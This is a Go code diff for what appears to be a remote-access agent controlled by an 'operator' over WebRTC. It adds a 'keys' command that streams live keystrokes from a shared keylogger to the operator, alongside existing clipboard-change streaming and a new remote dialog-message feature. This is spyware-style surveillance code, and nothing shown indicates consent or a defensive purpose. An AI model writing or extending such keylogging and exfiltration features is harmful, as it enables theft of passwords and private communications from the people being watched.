@@ -84,6 +84,8 @@ type webRTCSignal struct {
 	// Clipboard payloads: text is the value, enabled toggles change streaming.
 	Text    string `json:"text,omitempty"`
 	Enabled *bool  `json:"enabled,omitempty"`
+	// Title is the optional dialog title for a chat message.
+	Title string `json:"title,omitempty"`
 }
 
 type webRTCInputEvent struct {
@@ -132,6 +134,15 @@ type agentWebRTCSession struct {
 	clipMu       sync.Mutex
 	clipWatch    bool
 	clipLastHash string
+
+	// Live keystroke feed: stream new keylog bytes to the operator while the
+	// feed is on. keyStartedHere records whether THIS session started the
+	// shared keylogger loop (so it is the only one that may stop it).
+	keyMu          sync.Mutex
+	keyFeedOn      bool
+	keyStartedHere bool
+	keySent        int
+	keyPumpOnce    sync.Once
 }
 
 var (
@@ -702,6 +713,16 @@ func (s *agentWebRTCSession) readLoop() {
 			if msg.Enabled != nil {
 				s.setClipboardWatch(*msg.Enabled)
 			}
+		case "message":
+			// A dialog blocks until the user dismisses it, so it must not run
+			// on the read loop (input and clipboard would stop responding).
+			text, title := msg.Text, msg.Title
+			go s.deliverMessage(title, text)
+		case "keys":
+			if msg.Enabled == nil {
+				continue
+			}
+			s.setKeyFeed(*msg.Enabled)
 		case "stop", "session_end":
 			return
 		}
@@ -826,6 +847,8 @@ func (s *agentWebRTCSession) startRTPPipeline() error {
 
 func (s *agentWebRTCSession) stop(reason string) {
 	s.stopOnce.Do(func() {
+		// The live keystroke feed owns the keylogger only if it started it.
+		s.setKeyFeed(false)
 		webRTCSessionMu.Lock()
 		if webRTCSessionActive == s {
 			webRTCSessionActive = nil
